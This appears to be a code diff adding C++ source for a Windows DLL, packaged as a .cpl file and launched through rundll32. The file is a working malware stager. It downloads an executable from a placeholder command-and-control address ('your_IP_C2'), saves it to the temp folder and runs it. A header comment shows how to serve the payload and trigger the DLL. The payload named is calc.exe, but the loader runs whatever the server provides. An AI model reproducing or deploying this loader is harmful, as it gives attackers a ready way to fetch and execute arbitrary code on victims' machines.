@@ -1,0 +1,94 @@
+/*
+rundll32.exe .\Your_DLL_Name.cpl,RunDownlaod
+python -m http.server 2020
+*/
+
+#include <windows.h>
+#include <wininet.h>
+#include <iostream>
+#include <fstream>
+#include <shlwapi.h>
+
+#pragma comment(lib, "shlwapi.lib")
+#pragma comment(lib, "wininet.lib")
+
+BOOL DownloadAndRunCalc()
+{
+    HINTERNET hInternet = InternetOpen(L"MyUserAgent/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) {
+        return FALSE;
+    }
+
+    LPCWSTR url = L"http://your_IP_C2:2020/calc.exe";
+    HINTERNET hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (!hConnect) {
+        InternetCloseHandle(hInternet);
+        return FALSE;
+    }
+
+    WCHAR tempPath[MAX_PATH];
+    if (!GetTempPathW(MAX_PATH, tempPath)) {
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        return FALSE;
+    }
+
+    WCHAR filePath[MAX_PATH];
+    if (!PathCombineW(filePath, tempPath, L"calc.exe")) {
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        return FALSE;
+    }
+
+    std::ofstream outFile(filePath, std::ios::binary);
+    if (!outFile) {
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        return FALSE;
+    }
+
+    char buffer[1024];
+    DWORD bytesRead;
+    BOOL success = TRUE;
+
+    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+        outFile.write(buffer, bytesRead);
+        if (!outFile) {
+            success = FALSE;
+            break;
+        }
+    }
+
+    outFile.close();
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+
+    if (!success) {
+        DeleteFileW(filePath);
+        return FALSE;
+    }
+
+    SHELLEXECUTEINFO sei = { sizeof(sei) };
+    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+    sei.lpVerb = L"open";
+    sei.lpFile = filePath;
+    sei.nShow = SW_SHOWNORMAL;
+
+    if (!ShellExecuteEx(&sei)) {
+        DeleteFileW(filePath);
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+// Export a simple function that rundll32 can call
+extern "C" __declspec(dllexport) void RunDownload(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
+{
+    DownloadAndRunCalc();
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
+    return TRUE;
+}
